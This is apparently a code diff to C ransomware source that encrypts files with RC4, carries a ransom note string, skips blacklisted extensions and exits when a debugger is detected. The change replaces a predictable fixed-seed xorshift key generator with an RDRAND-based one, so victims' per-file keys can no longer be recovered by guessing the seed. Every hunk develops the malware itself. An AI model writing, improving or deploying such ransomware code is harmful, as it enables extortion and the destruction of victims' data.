@@ -15,6 +15,7 @@
 #define SIGNATURE                   0x4d4f4f42  // 'BOOM' 
 #define KEY_SIZE                    32
 #define HINT_BYTE                   0xB4
+
 /*
 ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */
 
@@ -56,7 +57,9 @@ LPCSTR g_Note = {
 
 DWORD   g_StartTime,
         g_FinishTime;
-UINT    g_RngSeed = 0x01234567;
+UINT    g_RngSeed = 0;
+
+extern int __cdecl _rdrand32_step(unsigned int*);
 
 typedef struct _THREAD_PARAMS {
     char path[MAX_PATH];
@@ -68,6 +71,40 @@ typedef struct _ENCRYPTED_FILE_HEADER {
     BYTE  Rc4Key[KEY_SIZE];
 } ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;
 
+
+PBYTE GenerateRandomBytes(IN DWORD dwKeySize) {
+
+    PBYTE			pKey = NULL;
+    unsigned short	us2RightMostBytes = NULL;
+    unsigned int	uiSeed = 0x00;
+    BOOL			bResult = FALSE;
+
+    if (!(pKey = _heapalloc(dwKeySize))) {
+        return NULL;
+    }
+
+    us2RightMostBytes = (unsigned short)((ULONG_PTR)pKey & 0xFFFF);
+
+    for (int i = 0; i < dwKeySize; i++) {
+
+        if (!_rdrand32_step(&uiSeed))
+            goto _END_OF_FUNC;
+
+        if (i % 2 == 0)
+            pKey[i] = (unsigned int)(((us2RightMostBytes ^ uiSeed) & 0xFF) % 0xFF);
+        else
+            pKey[i] = (unsigned int)((((us2RightMostBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF);
+    }
+
+    bResult = TRUE;
+
+_END_OF_FUNC:
+    if (!bResult && pKey) {
+        _heapfree(pKey);
+        return NULL;
+    }
+    return pKey;
+}
 LPCWSTR GetFileExtensionW(LPCWSTR filePath) { 
     
     LPCWSTR dot = _wcsrchr(filePath, L'.');
@@ -87,20 +124,6 @@ BOOL IsBlacklistedExtension(LPCWSTR filePath) {
     return FALSE;
 }
 
-unsigned int GenerateRandomInt() {
-    g_RngSeed ^= g_RngSeed << 13;
-    g_RngSeed ^= g_RngSeed >> 17;
-    g_RngSeed ^= g_RngSeed << 5;
-    return g_RngSeed;
-}
-
-void GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
-
-    for (int i = 0; i < sSize; i++) {
-        pByte[i] = (BYTE)GenerateRandomInt() % 0xFF;
-    }
-
-}
 
 void EncryptSingleFile(const char* path) {
 
@@ -129,8 +152,8 @@ void EncryptSingleFile(const char* path) {
     }
     CloseHandle(hFile);
 
-    BYTE randomKey[KEY_SIZE];
-    GenerateRandomBytes(randomKey, KEY_SIZE);
+    
+    PBYTE randomKey = GenerateRandomBytes(KEY_SIZE);
     RC4_CTX ctx;
     KSA(&ctx, randomKey, KEY_SIZE);
     PRGA(&ctx, buffer, size);
@@ -404,10 +427,9 @@ BOOL Run(LPCWSTR* dirs, BOOL isEncrypting) {
 
 int main() {
 
-    if (g_AntiDebug && IsBeingDebugged()) {
+    if (g_AntiDebug && IsBeingDebugged()) 
         return -1;
-    }
-  
+    
     if (g_Verbose)
         g_StartTime = (DWORD)GetTickCount64();
     
